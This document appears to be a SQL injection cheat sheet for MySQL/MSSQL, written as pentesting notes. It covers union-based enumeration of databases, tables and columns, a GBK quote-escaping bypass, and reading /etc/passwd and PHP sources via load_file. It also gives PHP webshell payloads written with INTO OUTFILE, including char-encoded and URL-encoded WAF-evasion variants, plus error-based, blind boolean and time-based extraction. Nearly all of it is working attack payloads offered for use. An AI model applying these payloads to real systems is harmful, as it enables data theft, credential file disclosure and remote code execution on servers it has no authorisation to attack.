For MySQL/MSSQL: `select @@version` can return the version, others will error

`%09` can be used in case space is filtered. Of course comments can also.

`\xBF'` or URL encoded `%bf%27` to create a single quote that won't be escaped properly. (only in GBK) Example: `admin%bf%27%20or%201=1%20--+`

`sleep(5)` will delay 5 seconds

check can how many columns: `order by x`, keep on increasing until error. last number will be number of columns

Concatenating (concatenate put 2 together, group concatenate put all the values in one column as one): `concat(name1,":",name2)` or `group_concat(column_name)`

To comment, use `xx-- `(got space in the end, important)

Show all <b>databases</b>: `select schema_name from information_schema.schemata;` OR `show databases;` show the database in the current one: `select database()`

Show the <b>table name</b> and which database it is from, for a database call xx: `select table_name, table_schema from information_schema.tables where table_schema='xx'`

Show the <b>column name</b> if table name is yy: `select column_name,table_schema from information_schema.columns where table_name='yy'`

Finally to retrieve the info use `select bb, cc from xx.yy`

See which user logged in: `select user()`

Check if got superuser privilege: `select super_priv from mysql.user where user="xx"`

Check privilege in detailed: `select grantee, privilege_type from information_schema.user_privileges`

Read file from OS: `select load_file("/etc/passwd")` (Can attempt to load the current php page to disclose sensitive info using default path like /var/www/html/xx.php) <b>USE DOUBLE SLASH FOR WINDOWS IF FAIL</b>

Check secure file privileges: `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"` (Empty=can read/write everywhere. If got a folder name means only read/write from there. NULL=read/write nowhere)\
Alternative:\
`SELECT @@GLOBAL.secure_file_priv;`

Write file into OS (must have FILE privilege, secure_file_priv not enabled, and write access to the server): `select "xxx" into outfile "/var/html/www/test.php"` (c:/xampp/htdocs/ can try too) <b>USE DOUBLE SLASH FOR WINDOWS IF FAIL</b>

For example to write webshell(using 0 as parameter for RCE), can use `select "", "<?php system($_REQUEST[0]); ?>","" into outfile "/var/www/html/test.php"`

One example of full writing webshell to Windows (bypassing waf/encoding, using 0 as parameter for RCE): `UNION SELECT char(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,82,69,81,85,69,83,84,91,48,93,41,59,32,63,62) INTO OUTFILE "C:\\wamp\\www\\PHP\\shell1.php"`

Another webshell example tested on MariaDB using the encoded version: 
Text: `' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php' -- `
Encoded: `%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27+--+`

<b>Error based</b> (show 32 characters only, and cannot use if the output is pure alphanumeric or starts with `/` `.` and `@`)\
`extractvalue('',concat('>',version()))`

<b>Blind boolean based:</b> First still try to establish the number of columns (order by x/union select null,null..). Once established, use the following (if eg previously is 3 columns) to get <b>database name</b>: `union select null,null,null where database() like '%';-- `, after that `union select null,null,null where database() like 'a%';-- `, and keep on until you get database name. To get <b>table name</b>, use `union select null,null,null from information_schema.tables where table_schema = 'dbname' and table_name like 'a%';-- `. Finally to get <b>column name</b>, use `union select null,null,null from information_schema.columns where table_schema='dbname' and table_name='tablename' and column_name like 'a%';-- `. To remove as there are multiple columns, use `union select null,null,null from information_schema.columns where table_schema='dbname' and table_name='tablename' and column_name like 'a%' and column_name!='notthis';-- `. <b>After getting all details</b>, use the following to extract the information `union select 1,2,3 from dbname.tablename where columnname like 'a%';-- `. Repeat for multiple column names.

<b>Blind time based:</b> Almost same as blind boolean. First establish number of columns while setting one of them to sleep(5), and keep on adding until you get a different response time which means that is the correct number of columns. Example: `union select sleep(5),null;-- `. After that just follow blind boolean based.
